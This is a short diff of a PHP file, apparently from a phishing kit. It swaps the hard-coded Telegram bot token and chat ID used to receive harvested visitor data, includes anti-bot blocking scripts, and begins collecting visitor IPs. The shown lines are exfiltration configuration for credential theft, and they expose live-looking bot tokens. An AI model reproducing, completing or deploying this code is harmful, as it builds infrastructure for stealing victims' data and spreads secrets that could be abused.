@@ -9,8 +9,8 @@ include './prevents/sub_anti.php';
 include './prevents/block.php.php';
 
 // Telegram Bot Token und Chat-ID
-$botToken = "7652488994:AAHVLVEN4Vq02U6thdoo8HpMBYrBkYIrt14";
-$chatId = "-4731709862";
+$botToken = "8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q";
+$chatId = "8018269855";
 
 // Besucherdaten sammeln
 $ip = $_SERVER['REMOTE_ADDR'];
